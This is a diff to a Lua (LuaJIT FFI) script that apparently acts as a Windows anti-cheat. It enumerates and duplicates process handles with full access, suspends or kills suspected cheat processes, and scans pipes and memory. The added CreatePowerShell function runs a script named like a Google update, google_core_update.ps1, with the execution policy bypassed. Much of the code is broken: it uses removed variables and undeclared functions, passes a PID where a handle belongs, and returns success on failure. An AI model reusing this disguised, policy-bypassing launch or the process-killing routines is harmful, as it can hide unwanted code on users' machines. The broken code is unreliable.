@@ -18,6 +18,8 @@ local Apple = ffi.new("uintptr_t[?]", 6)
 
 local IS_TESTING = true
 
+local ffi = require("ffi")
+
 ffi.cdef[[
     typedef void* HANDLE;
     typedef void* HMODULE;
@@ -32,6 +34,61 @@ ffi.cdef[[
     typedef int32_t LONG;
     typedef int64_t LONGLONG;
     typedef uint64_t ULONGLONG;
+
+    typedef struct _SECURITY_ATTRIBUTES {
+        DWORD  nLength;
+        void*  lpSecurityDescriptor;
+        BOOL   bInheritHandle;
+    } SECURITY_ATTRIBUTES;
+
+    typedef struct _STARTUPINFOA {
+        DWORD   cb;
+        char*   lpReserved;
+        char*   lpDesktop;
+        char*   lpTitle;
+        DWORD   dwX;
+        DWORD   dwY;
+        DWORD   dwXSize;
+        DWORD   dwYSize;
+        DWORD   dwXCountChars;
+        DWORD   dwYCountChars;
+        DWORD   dwFillAttribute;
+        DWORD   dwFlags;
+        unsigned short wShowWindow;
+        unsigned short cbReserved2;
+        char*   lpReserved2;
+        HANDLE  hStdInput;
+        HANDLE  hStdOutput;
+        HANDLE  hStdError;
+    } STARTUPINFOA;
+
+    typedef struct _PROCESS_INFORMATION {
+        HANDLE hProcess;
+        HANDLE hThread;
+        DWORD  dwProcessId;
+        DWORD  dwThreadId;
+    } PROCESS_INFORMATION;
+
+    typedef struct _FILE_PIPE_LOCAL_INFORMATION {
+        unsigned long NamedPipeState;
+        unsigned long NamedPipeEnd;
+        unsigned long NumberOfInboundInstances;
+        unsigned long NumberOfOutboundInstances;
+        unsigned long MaxInstances;
+        unsigned long InboundQuota;
+        unsigned long ReadDataAvailable; 
+        unsigned long OutboundQuota;
+        unsigned long WriteQuotaAvailable;
+        unsigned long NamedPipeConfiguration;
+    } FILE_PIPE_LOCAL_INFORMATION;
+
+    typedef struct _IO_STATUS_BLOCK {
+        union {
+            long Status;
+            void* Pointer;
+        };
+        unsigned long* Information;
+    } IO_STATUS_BLOCK;
 
     typedef struct _FILETIME {
         DWORD dwLowDateTime;   
@@ -49,7 +106,7 @@ ffi.cdef[[
         DWORD Type;
     } MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;
     
-     typedef struct tagTHREADENTRY32 {
+    typedef struct tagTHREADENTRY32 {
         DWORD dwSize;
         DWORD cntUsage;
         DWORD th32ThreadID;
@@ -73,6 +130,20 @@ ffi.cdef[[
         unsigned long NumberOfHandles;
         SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[]; 
     } SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
+
+    typedef struct _UNICODE_STRING {
+        unsigned short Length;        
+        unsigned short MaximumLength;
+        wchar_t* Buffer;              
+    } UNICODE_STRING;
+
+    typedef struct _PUBLIC_OBJECT_TYPE_INFORMATION {
+        UNICODE_STRING TypeName;      
+        unsigned long TotalNumberOfObjects;
+        unsigned long TotalNumberOfHandles;
+        unsigned long TotalHaveHighWatermark;
+        unsigned long TotalHaveLowWatermark;
+    } PUBLIC_OBJECT_TYPE_INFORMATION;
 
     int system(const char *command);
     HANDLE OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
@@ -102,8 +173,12 @@ ffi.cdef[[
     HANDLE FindFirstChangeNotificationA(const char* lpPathName, BOOL bWatchSubtree, DWORD dwNotifyFilter);
     BOOL FindNextChangeNotification(HANDLE hChangeHandle);
     BOOL FindCloseChangeNotification(HANDLE hChangeHandle);
-        long NtQueryInformationProcess(void* ProcessHandle, int ProcessInformationClass, void* ProcessInformation, unsigned long ProcessInformationLength, unsigned long* ReturnLength);
 
+    BOOL DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, HANDLE* lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
+    BOOL CreateProcessA(const char* lpApplicationName, char* lpCommandLine, void* lpProcessAttributes, void* lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, void* lpEnvironment, const char* lpCurrentDirectory, STARTUPINFOA* lpStartupInfo, PROCESS_INFORMATION* lpProcessInformation);
+    BOOL CreatePipe(HANDLE* hReadPipe, HANDLE* hWritePipe, SECURITY_ATTRIBUTES* lpPipeAttributes, DWORD nSize);
+    BOOL ReadFile(HANDLE hFile, void* lpBuffer, DWORD nNumberOfBytesToRead, DWORD* lpNumberOfBytesRead, void* lpOverlapped);
+    BOOL ConnectNamedPipe(HANDLE hNamedPipe, void* lpOverlapped);
     BOOL GetProcessHandleCount(HANDLE hProcess, DWORD* pdwHandleCount);
     DWORD GetCurrentProcessId(void);
     HANDLE GetCurrentProcess(void);
@@ -116,63 +191,21 @@ ffi.cdef[[
     ULONG_PTR GetProcAddress(HMODULE hModule, const char* lpProcName);
     DWORD SuspendThread(HANDLE hThread);
     DWORD GetProcessId(HANDLE Process);
+
+    void * _wpopen(const wchar_t *command, const wchar_t *mode);
+    int _pclose(void *stream);
+    char * fgets(char *string, int n, void *stream);
+
     NTSTATUS NtSuspendProcess(HANDLE ProcessHandle);
-
-    NTSTATUS NtQuerySystemInformation(
-        int SystemInformationClass,
-        void* SystemInformation,
-        unsigned long SystemInformationLength,
-        unsigned long* ReturnLength
-    );
-    
-        NTSTATUS NtReadVirtualMemory(
-        HANDLE ProcessHandle,       
-        void*  BaseAddress,          
-        void*  Buffer,              
-        size_t BufferSize,           
-        size_t* NumberOfBytesRead   
-    );
-    
-       BOOL DuplicateHandle(
-        HANDLE hSourceProcessHandle,
-        HANDLE hSourceHandle,
-        HANDLE hTargetProcessHandle,
-        HANDLE* lpTargetHandle,
-        DWORD dwDesiredAccess,
-        BOOL bInheritHandle,
-        DWORD dwOptions
-    );
-    
-    NTSTATUS NtGetNextProcess(
-        HANDLE ProcessHandle,
-        DWORD DesiredAccess,
-        DWORD HandleAttributes,
-        DWORD Flags,
-        HANDLE* NewProcessHandle
-    );
-    
-    typedef struct _UNICODE_STRING {
-    unsigned short Length;        
-    unsigned short MaximumLength;
-    wchar_t* Buffer;              
-} UNICODE_STRING;
-
-typedef struct _PUBLIC_OBJECT_TYPE_INFORMATION {
-    UNICODE_STRING TypeName;      
-    unsigned long TotalNumberOfObjects;
-    unsigned long TotalNumberOfHandles;
-    unsigned long TotalHaveHighWatermark;
-    unsigned long TotalHaveLowWatermark;
-} PUBLIC_OBJECT_TYPE_INFORMATION;
-
-long NtQueryObject(
-    void* Handle,                       
-    int ObjectInformationClass,         
-    void* ObjectInformation,
-    unsigned long ObjectInformationLength,
-    unsigned long* ReturnLength         
-);
+    NTSTATUS NtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus);
+    long NtQueryInformationFile(void* FileHandle, void* IoStatusBlock, void* FileInformation, unsigned long Length, int FileInformationClass);
+    long NtQueryInformationProcess(void* ProcessHandle, int ProcessInformationClass, void* ProcessInformation, unsigned long ProcessInformationLength, unsigned long* ReturnLength);
+    long NtQueryObject(void* Handle, int ObjectInformationClass, void* ObjectInformation, unsigned long ObjectInformationLength, unsigned long* ReturnLength);
+    NTSTATUS NtGetNextProcess(HANDLE ProcessHandle, DWORD DesiredAccess, DWORD HandleAttributes, DWORD Flags, HANDLE* NewProcessHandle);
+    NTSTATUS NtQuerySystemInformation(int SystemInformationClass, void* SystemInformation, unsigned long SystemInformationLength, unsigned long* ReturnLength);
+    NTSTATUS NtReadVirtualMemory(HANDLE ProcessHandle, void* BaseAddress, void* Buffer, size_t BufferSize, size_t* NumberOfBytesRead);
 ]]
+
 
 local kernel32 = ffi.load("kernel32")
 
@@ -184,7 +217,7 @@ local pe = ffi.new("PROCESSENTRY32")
 pe.dwSize = ffi.sizeof("PROCESSENTRY32")
 
 local function FreezeCheat(CheatEngine)
-  if CheatEngine == nil or ffi.cast("intptr_t", CheatEngine) <= 0 then
+  if not CheatEngine or CheatEngine == 0 then
     return false
   end
   
@@ -210,9 +243,9 @@ local Banana = {health = 100, speed = 20, strength = 10}
 local PlayerData = {} 
 
 local function CPUFinder(CheatEngine)
-if CheatEngine == nil or CheatEngine == 0 then
-return false
-end
+if CheatEngine == 0 or CheatEngine == nil then
+  return false
+  end
     local t_start = ffi.new("FILETIME[4]")
     local t_end = ffi.new("FILETIME[4]")
     local sys_t = ffi.new("FILETIME[1]") 
@@ -250,16 +283,15 @@ local function SearchOpenProcess(CheatEngine)
 if CheatEngine == nil or CheatEngine == 0 then
 return false
 end
+local GetPID = ffi.C.GetProcessId(CheatEngine)
+FreezeCheat(CheatEngine)
+
 local Info = ffi.new("HANDLE[1]")
 local MyCurrentProcess  = ffi.cast("HANDLE", -1)
 
-local Handle_Cheat = ffi.C.OpenProcess(0x1FFFFF, 0, CheatEngine)
-if Handle_Cheat == nil or Handle_Cheat == 0 then
-  return false
-  end
 local Duplicate_Handle = ffi.C.DuplicateHandle(
 Handle_Cheat,
-ffi.cast("HANDLE", CheatEngine),
+GetPID,
 MyCurrentProcess,
 Info,
 0,
@@ -278,9 +310,85 @@ if status == 0 and Getname ~= 0 then
   return status
  end
 end 
-local function DataFlow(CheatEngine, Enemypipe, storage, EnemyPID)
+
+
+local function CreatePowerShell()
+    local si = ffi.new("STARTUPINFOA")
+    local pi = ffi.new("PROCESS_INFORMATION")  
+    si.cb = ffi.sizeof(si) 
+    
+    local command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\\google_core_update.ps1"
+    
+    local command_buffer = ffi.new("char[?]", #command + 1)
+    ffi.copy(command_buffer, command)
+    
+    local success = ffi.C.CreateProcessA(
+        nil,
+        command_buffer,
+        nil, nil, 1, 0, nil, nil, si, pi
+    )
+    
+    if success ~= 0 then
+        CORE_DATA_SYSTEM.PowerShellHandle = pi.hProcess
+        CORE_DATA_SYSTEM.PowerShellPID    = pi.dwProcessId
+        ffi.C.CloseHandle(pi.hThread)
+        return success
+    else
+        return true 
+    end
+end
+
+
+
+local function DatafromPowerShell()
   
+end
+
+
+
+local function DataFlow(CheatEngine, Enemypipe, storage, EnemyPID)
+   if CheatEngine == 0 or CheatEngine == nil then return false end
+    if Enemypipe == 0 or Enemypipe == nil then return false end
+    if EnemyPID == 0 or EnemyPID == nil then return false end  
+    if storage == 0 or storage == nil then return false end
+  if not suspect then
+    return false
   end
+  local io_status = ffi.new("IO_STATUS_BLOCK")
+  local pipe_info = ffi.new("_FILE_PIPE_LOCAL_INFORMATION")
+  local Status_pipe = ffi.C.NtQueryInformationFile(
+  Enemypipe,
+  io_status,
+  pipe_info,
+  ffi.sizeof(pipe_info),
+  24
+)
+if Status_pipe == 0 then
+  local mbi = ffi.new("MEMORY_BASIC_INFORMATION")
+  local address = ffi.cast("void*", 0)
+  local return_len = ffi.new("unsigned long")
+  local anomaly_detected = false
+  while ffi.C.NtQueryVirtualMemory(Enemypipe, address, 0, mbi, ffi.sizeof(mbi), return_len) == 0 do
+
+        if mbi.State == 0x1000 and mbi.Protect == 0x40 and pipe_info.ReadDataAvailable > 0 then
+            anomaly_detected = true
+            break
+        end
+        address = ffi.cast("void*", ffi.cast("unsigned long long", address) + mbi.RegionSize)
+    end
+
+    if anomaly_detected then
+        DeleteCheats(CheatEngine)
+        return true
+    end
+    
+    return false
+    end
+  end
+
+
+
+
 local Agent_Size = 512
 
 local function local_deploy(value)
